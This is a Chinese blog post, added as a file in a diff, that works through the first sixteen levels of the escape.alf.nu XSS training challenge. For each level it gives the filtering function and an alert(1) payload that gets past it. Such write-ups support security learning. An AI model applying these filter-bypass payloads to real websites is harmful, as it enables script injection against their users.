@@ -1,0 +1,326 @@
+---
+layout:     post
+title:      "escape.alf.nu"
+subtitle:   "Part 1"
+date:       2015-12-20
+author:     "dogewatch"
+header-img: "img/post-bg-js-version.jpg"
+tags:
+    - web
+---
+
+> "X站之路"
+
+## 前言
+
+看了一段时间的XSS，打算找点东西练练手，于是就找到了<a href="http://escape.alf.nu/">这个</a>。
+边查资料边做，还是有些收获吧，这里先把前面15个题做个总结。
+
+## 正文
+
+*<a href="http://escape.alf.nu/0">第0题</a>*
+
+```
+function escape(s) {
+  // Warmup.
+
+  return '<script>console.log("'+s+'");</script>';
+}
+```
+这里没有做任何的过滤，所以只需要闭合掉双引号和括号，最后用注释符注释掉剩余部分即可。
+```
+");alert(1)//
+```
+
+*<a href="http://escape.alf.nu/1">第1题</a>*
+
+```
+function escape(s) {
+  // Escaping scheme courtesy of Adobe Systems, Inc.
+  s = s.replace(/"/g, '\\"');
+  return '<script>console.log("' + s + '");</script>';
+}
+```
+这里对双引号做了转义，因此不能直接使用双引号闭合。但是因为没有对反斜线做转义，所以可以用反斜线去转义掉双引号前的反斜线从而使得双引号依然可以闭合。
+```
+\");alert(1)//
+```
+
+*<a href="http://escape.alf.nu/2">第2题</a>*
+
+```
+function escape(s) {
+  s = JSON.stringify(s);
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+这里用JSON.stringify对反斜线做了转义，所以不能采用上一题的解法。但是'<'、'>'均未被过滤，所以可以直接闭合script标签后另起一个script标签进行弹窗。
+```
+</script><script>alert(1)//
+```
+
+*<a href="http://escape.alf.nu/3">第3题</a>*
+
+```
+function escape(s) {
+  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
+  console.log(url);
+
+  var a = document.createElement('a');
+  a.href = url;
+  document.body.appendChild(a);
+  a.click();
+}
+```
+这里同样用stringify对双引号和反斜线做了过滤。但是可以发现s的值放入了url中，猜测可以使用URL编码绕过。将第0题的payload中的双引号替换为%22成功绕过。
+```
+%22);alert(1)//
+```
+
+*<a href="http://escape.alf.nu/4">第4题</a>*
+
+```
+function escape(s) {
+  var text = s.replace(/</g, '&lt;').replace('"', '&quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
+  return text;
+}
+```
+这题对'<'和'”'做了过滤，但是其中双引号只过滤了一个。又因为$2中只能放置字母，所以考虑将用来闭合的双引号放在$1中。
+```
+[[s|""onload="alert(1)]]
+```
+
+*<a href="http://escape.alf.nu/5">第5题</a>*
+
+```
+function escape(s) {
+  // Level 4 had a typo, thanks Alok.
+  // If your solution for 4 still works here, you can go back and get more points on level 4 now.
+
+  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
+  return text;
+}
+```
+这里明显弥补了上一题的漏洞，所以不能再直接使用双引号闭合。于是可以借用第二个替换中的双引号去闭合。为了使a标签里的前后两个双引号被闭合img里的双引号闭合掉，需要在onload=alert(1)后用双斜线注释符。
+```
+[[a|http://onload=alert(1)//]]
+```
+可以看到在chrome中被最后解析为
+```
+<img alt="<a href=" http:="" onload="alert(1)//&quot;" src="a.gif">
+"&gt;http://onload=alert(1)//]]
+```
+
+*<a href="http://escape.alf.nu/6">第6题</a>*
+
+```
+function escape(s) {
+  // Slightly too lazy to make two input fields.
+  // Pass in something like "TextNode#foo"
+  var m = s.split(/#/);
+
+  // Only slightly contrived at this point.
+  var a = document.createElement('div');
+  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
+  return a.innerHTML;
+}
+```
+可以看到这题是以'#'为分隔符，前面部分与create拼接作为方法，后面部分则作为该方法的一个参数。差了些资料后发现这里使用的是createComment方法，即创建注释标签。后半部分闭合掉注释标签后就可以任意施为了。选一个字符相对较少的
+```
+Comment#><svg/onload=alert(1)
+```
+
+*<a herf="http://escape.alf.nu/7/">第7题</a>*
+
+```
+function escape(s) {
+  // Pass inn "callback#userdata"
+  var thing = s.split(/#/);
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
+  return "<script>" + thing[0] + "(" + json +")</script>";
+}
+```
+这题跟之前的类似，也是以'#'为分隔符。虽然过滤了双引号但是依然可以使用单引号。
+```
+'#';alert(1)//
+```
+
+*<a href="http://escape.alf.nu/8">第8题</a>*
+
+```
+function escape(s) {
+  // Courtesy of Skandiabanken
+  return '<script>console.log("' + s.toUpperCase() + '")</script>';
+}
+```
+这题将所有的字母替换成了大写形式，因此有两种思路，一是闭合script标签然后引用外部js，而是用<a href="http://www.jsfuck.com/">JSFUCK</a>。
+JSFUCK的原理是用类似```[]['sort']['constructor'](alert(1))```的方式，通过构造字符串来执行相应的函数。而构造字符串需要的字母则通过将布尔值转为字符串后取字母的方式获取，例如字母'a'就可以用```(![]+[])[1]```来获取,字母'b'则可以用```(''+{})[2]```来获取。
+参考资料：<a href="http://www.freebuf.com/articles/web/81688.html#rd">http://www.freebuf.com/articles/web/81688.html#rd</a>
+
+*<a href="http://escape.alf.nu/9/">第9题</a>*
+
+```
+function escape(s) {
+  // This is sort of a spoiler for the last level :-)
+
+  if (/[\\<>]/.test(s)) return '-';
+
+  return '<script>console.log("' + s.toUpperCase() + '")</script>';
+}
+```
+这题过滤的'<','>'所以不能引用外部JS。采用上一题的第二种方式即可。
+
+*<a href="http://escape.alf.nu/10/">第10题</a>*
+
+```
+function escape(s) {
+  function htmlEscape(s) {
+    return s.replace(/./g, function(x) {
+       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
+     });
+  }
+
+  function expandTemplate(template, args) {
+    return template.replace(
+        /{(\w+)}/g,
+        function(_, n) {
+           return htmlEscape(args[n]);
+         });
+  }
+
+  return expandTemplate(
+    "                                                \n\
+      <h2>Hello, <span id=name></span>!</h2>         \n\
+      <script>                                       \n\
+         var v = document.getElementById('name');    \n\
+         v.innerHTML = '<a href=#>{name}</a>';       \n\
+      <\/script>                                     \n\
+    ",
+    { name : s }
+  );
+}
+```
+可以看到对很多XSS常用符号做了过滤，但是没有过滤反斜线。但是由于是先写入script再解析，所以可以使用JS支持的编码方式绕过。
+```
+\74svg/onload=alert(1)\76
+```
+
+*<a herf="http://escape.alf.nu/11">第11题</a>*
+
+```
+function escape(s) {
+  // Spoiler for level 2
+  s = JSON.stringify(s).replace(/<\/script/gi, '');
+
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+这里JSON化了字符串之外还过滤的'</script>'，只不过不是替换为别的字符串而是简单的替换为空，所以利用类似```</</scriptscript>```的方式就可以绕过。
+```
+</</scriptscript><script>alert(1)//
+```
+
+*<a href="http://escape.alf.nu/12">第12题</a>*
+
+```
+function escape(s) {
+  // Pass inn "callback#userdata"
+  var thing = s.split(/#/);
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/\//g, '\\/');
+  return "<script>" + thing[0] + "(" + json +")</script>";
+}
+```
+这题跟前面的一题类似，只不过多了对'/'的过滤，所以不能使用'//'注释符。但是javascript支持html的注释符```<!--```,因此可以绕过过滤。
+```
+'#';alert(1)<!--
+```
+
+*<a href="http://escape.alf.nu/13">第13题</a>*
+
+```
+function escape(s) {
+  var tag = document.createElement('iframe');
+
+  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
+  //
+  // http://print.alf.nu/?html=... just outputs whatever you pass in.
+  //
+  // Alerting from print.alf.nu won't count; try to trigger the one below.
+
+  s = '<script>' + s + '<\/script>';
+  tag.src = 'http://print.alf.nu/?html=' + encodeURIComponent(s);
+
+  window.WINNING = function() { youWon = true; };
+
+  tag.onload = function() {
+    if (youWon) alert(1);
+  };
+  document.body.appendChild(tag);
+}
+```
+这个题想了好久都没整明白，最后还是看了别人的题解T_T。看题目可以知道加载了不同域的一个页面，而这个页面下存在反射型XSS。题目的要求是在子域下让父域里的变量youWon存在。
+window对象中可以这样访问一个子窗口:```window.frames['窗口名']```，并且由于window对象是全局对象，所以省略window也可以访问：```frames['窗口名']```。 而其实还可以使用数组索引的方法访问一个子窗口: ```window['窗口名']```这种写法还可以表示为:```window.窗口名``` 因此在子域名里设置name='youWon';其实就是将子窗口名设置为youWon，这样导致父窗口下可以这样访问了window.youWon。
+```
+name='youWon';
+```
+
+*<a href="http://escape.alf.nu/14">第14题</a>*
+
+```
+function escape(s) {
+  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
+  function html(s) { return s.replace(/[<>"&]/g, function(s) {
+                        return '&#' + s.charCodeAt(0) + ';'; }); }
+
+  return (
+    '<script>' +
+      'var url = ' + json(s) + '; // We\'ll use this later ' +
+    '</script>\n\n' +
+    '  <!-- for debugging -->\n' +
+    '  URL: ' + html(s) + '\n\n' +
+    '<!-- then suddenly -->\n' +
+    '<script>\n' +
+    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
+    '  else new Image().src = url;\n' +
+    '</script>'
+  );
+}
+```
+这个题参考了<a href="https://communities.coverity.com/blogs/security/2012/11/16/did-i-do-that-html-5-js-escapers-3">这篇文章</a>。当```<!--```注释符遇到<script>标签时会开始找</script>标签，然后注释掉这两个标签。如果填写的字符串类似```<!--<script>```时，最近的的</script>标签就会被注释掉。此时'URL:xxx'的内容变成了JS代码，而下面的if语句中有```*/```，因此只要在前面填入```/*```符号匹配即可注释掉中间的多余代码。然后用```if(alert(1)```与后面拼接可得```if(alert(1).test(url))```，从而执行alert(1)。
+```
+if(alert(1)/*<!--<script>
+```
+
+*<a href="http://escape.alf.nu/15">第15题</a>*
+
+```
+function escape(s) {
+  return s.split('#').map(function(v) {
+      // Only 20% of slashes are end tags; save 1.2% of total
+      // bytes by only escaping those.
+      var json = JSON.stringify(v).replace(/<\//g, '<\\/');
+      return '<script>console.log('+json+')</script>';
+      }).join('');
+}
+```
+这个题依然用'#'为分隔符，将前后两部分分别填入两段JS中。由于过滤了'</script'，所以不能直接加标签来XSS。用上一题```<!--<script>```的方式使中间两个script标签失效。然后用'/'来与</script>中的'/'形成正则，同时用')'来闭合正则中的'('。
+```
+<!--<script>#-->)/;alert(1)//
+```
+
+##后记
+本来以为15题就是结束了，结果后面还有16题。然后发现总共有101道题，感觉是有生之年系列了，不能知道能不能搞完。本来以为做了一遍写这篇文章应该是很快的，没想到还是弄了一下午，很多东西做一遍根本没印象，是不是该吃点啥补补脑子了T_T。要期末了，求各路神仙保佑别挂科啊，想到我邮这学期这么多跳楼的，老师们会不会心慈手软一点呢。。。
